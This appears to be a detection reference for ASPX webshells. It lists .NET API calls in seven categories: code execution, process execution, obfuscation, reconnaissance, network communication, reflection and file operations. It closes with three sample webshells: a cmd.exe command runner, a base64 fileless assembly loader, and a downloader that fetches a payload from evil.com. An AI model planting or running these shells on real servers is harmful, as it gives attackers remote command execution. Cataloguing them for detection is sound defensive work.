# ASPX Dangerous Patterns — 7 Behavioral Categories

ASPX targets ASP.NET web applications on Windows/IIS. Leverages .NET reflection, process execution, and file system APIs.

## Category 1: Code Execution

| Pattern | Signature | Notes |
|---------|-----------|-------|
| `System.Reflection.Assembly.Load` | `Assembly.Load(bytes)` | Load assembly from byte array — fileless execution |
| `Assembly.LoadFile` | `Assembly.LoadFile(path)` | Load assembly from file |
| `Assembly.LoadFrom` | `Assembly.LoadFrom(path)` | Load assembly from file path |
| `.GetMethod().Invoke()` | `type.GetMethod(name).Invoke(obj, args)` | Reflective method invocation |
| `System.CodeDom.Compiler` | `CodeDomProvider.CreateCompiler()` | Compile and execute C# code at runtime |
| `Microsoft.CSharp.CSharpCodeProvider` | `CSharpCodeProvider.CompileAssemblyFromSource()` | Compile C# source to assembly |
| `Page.RegisterStartupScript()` | Register client script | Script injection |
| `Page.RegisterClientScriptBlock()` | Register client block | Script injection |

## Category 2: Program Execution

| Pattern | Signature | Notes |
|---------|-----------|-------|
| `System.Diagnostics.Process.Start()` | `Process.Start(cmd)` | Most common ASPX webshell primitive |
| `Process.StartInfo` | `new ProcessStartInfo(cmd)` | Process configuration |
| `ProcessStartInfo.FileName` | `.FileName = "cmd.exe"` | Set executable |
| `ProcessStartInfo.Arguments` | `.Arguments = "/c " + cmd` | Set command arguments |
| `ProcessStartInfo.RedirectStandardOutput` | `.RedirectStandardOutput = true` | Capture command output |
| `ProcessStartInfo.UseShellExecute` | `.UseShellExecute = false` | Critical for output capture |
| `Process.Start()` with `ProcessStartInfo` | Launch with configured args | Full command execution chain |

## Category 3: Obfuscation & Encryption

| Pattern | Signature | Notes |
|---------|-----------|-------|
| `Convert.FromBase64String()` | `Convert.FromBase64String(b64)` | Base64 decode — most common |
| `Convert.ToBase64String()` | `Convert.ToBase64String(bytes)` | Base64 encode |
| `Encoding.UTF8.GetString()` | `.GetString(bytes)` | Byte array to string (after decode) |
| `Encoding.ASCII.GetBytes()` | `.GetBytes(str)` | String to bytes |
| `Encoding.Unicode.GetString()` | Unicode byte decoding | Unicode-based obfuscation |
| `System.Security.Cryptography.AesManaged` | AES decrypt | Encrypted payload decryption |
| `RijndaelManaged` | AES/Rijndael | Older .NET crypto |
| `DESCryptoServiceProvider` | DES decrypt | Legacy crypto |
| `TripleDESCryptoServiceProvider` | 3DES decrypt | Legacy crypto |
| `Xor` loops | Byte-wise XOR loops | Simple obfuscation |

## Category 4: Information Gathering

| Pattern | Signature | Notes |
|---------|-----------|-------|
| `Server.MapPath()` | `Server.MapPath(path)` | Virtual to physical path — critical recon |
| `Request.ServerVariables` | `Request.ServerVariables["var"]` | Server variable enumeration |
| `Request.PhysicalApplicationPath` | Web root path | File system recon |
| `Environment.CurrentDirectory` | `.NET env` | Current directory |
| `Environment.GetEnvironmentVariable()` | Windows env vars | Environment recon |
| `Environment.OSVersion` | OS version | System info |
| `Environment.MachineName` | Machine name | Host identifier |
| `Environment.UserName` | User name | Current user identity |
| `Environment.UserDomainName` | Domain name | Domain context |
| `System.Net.Dns.GetHostName()` | Host name | Network identity |
| `System.DirectoryServices` | AD queries | Active Directory enumeration |

## Category 5: Network Communication

| Pattern | Signature | Notes |
|---------|-----------|-------|
| `System.Net.WebClient` | `new WebClient()` | Download/upload — file transfer |
| `WebClient.DownloadFile()` | `.DownloadFile(url, path)` | Download payload to disk |
| `WebClient.DownloadString()` | `.DownloadString(url)` | Download text (eval chain) |
| `WebClient.DownloadData()` | `.DownloadData(url)` | Download binary |
| `WebClient.UploadFile()` | `.UploadFile(url, path)` | Data exfiltration |
| `WebClient.UploadString()` | `.UploadString(url, data)` | Exfiltration |
| `System.Net.HttpWebRequest` | `HttpWebRequest.Create(url)` | HTTP C2 communication |
| `System.Net.WebRequest` | `WebRequest.Create(url)` | Base class for HTTP |
| `System.Net.Sockets.TcpClient` | `new TcpClient(host, port)` | Raw TCP — reverse shell |
| `System.Net.Sockets.Socket` | `new Socket(...)` | Raw socket |
| `System.Net.Http.HttpClient` | `new HttpClient()` | Modern .NET HTTP client |

## Category 6: Callback / Reflection

| Pattern | Signature | Notes |
|---------|-----------|-------|
| `.GetType()` | `obj.GetType()` | Get runtime type |
| `.GetMethod()` | `type.GetMethod(name)` | Get method by name |
| `.GetMethods()` | `type.GetMethods()` | Get all methods |
| `.GetProperty()` | `type.GetProperty(name)` | Get property by name |
| `.GetProperties()` | `type.GetProperties()` | Get all properties |
| `.GetField()` | `type.GetField(name)` | Get field by name |
| `BindingFlags.NonPublic` | `BindingFlags.NonPublic` | Access private members |
| `BindingFlags.Static` | `BindingFlags.Static` | Access static members |
| `BindingFlags.Instance` | `BindingFlags.Instance` | Access instance members |
| `Activator.CreateInstance()` | `Activator.CreateInstance(type)` | Dynamic instantiation |
| `System.Delegate.CreateDelegate()` | Create delegate from method | Callback construction |

## Category 7: File Operations

| Pattern | Signature | Notes |
|---------|-----------|-------|
| `System.IO.File.WriteAllText()` | `File.WriteAllText(path, txt)` | Write file |
| `System.IO.File.WriteAllBytes()` | `File.WriteAllBytes(path, bytes)` | Write binary file |
| `System.IO.File.ReadAllText()` | `File.ReadAllText(path)` | Read file |
| `System.IO.File.ReadAllLines()` | `File.ReadAllLines(path)` | Read file lines |
| `System.IO.File.Delete()` | `File.Delete(path)` | Delete file |
| `System.IO.File.Copy()` | `File.Copy(src, dst)` | Copy file |
| `System.IO.File.Move()` | `File.Move(src, dst)` | Move file |
| `System.IO.FileInfo` | `new FileInfo(path)` | File metadata |
| `System.IO.Directory.GetFiles()` | `Directory.GetFiles(path)` | List directory |
| `System.IO.Directory.CreateDirectory()` | `Directory.CreateDirectory(path)` | Create directory |
| `System.IO.Directory.Delete()` | `Directory.Delete(path)` | Delete directory |
| `System.IO.FileStream` | `new FileStream(path, mode)` | Binary file I/O |
| `System.IO.StreamWriter` | `new StreamWriter(path)` | Text file write |
| `System.IO.StreamReader` | `new StreamReader(path)` | Text file read |

## Common ASPX Webshell Patterns

### Pattern 1: Classic Process.Start
```aspx
<%@ Page Language="C#" %>
<%
    string cmd = Request["cmd"];
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    Response.Write(p.StandardOutput.ReadToEnd());
%>
```
Chain: `Request["cmd"]` → `ProcessStartInfo` → `Process.Start()`

### Pattern 2: Assembly.Load (fileless)
```aspx
<%@ Page Language="C#" %>
<%
    byte[] bytes = Convert.FromBase64String(Request["code"]);
    Assembly asm = Assembly.Load(bytes);
    object obj = asm.CreateInstance("PayloadClass");
    MethodInfo mi = asm.GetType("PayloadClass").GetMethod("Run");
    mi.Invoke(obj, null);
%>
```
Chain: `Request["code"]` → `Convert.FromBase64String()` → `Assembly.Load()` → `.Invoke()`

### Pattern 3: WebClient payload download
```aspx
<%@ Page Language="C#" %>
<%
    WebClient wc = new WebClient();
    string payload = wc.DownloadString("http://evil.com/payload.txt");
    eval(payload); // or execute via CodeDom
%>
```
Chain: `WebClient.DownloadString()` → eval/compile
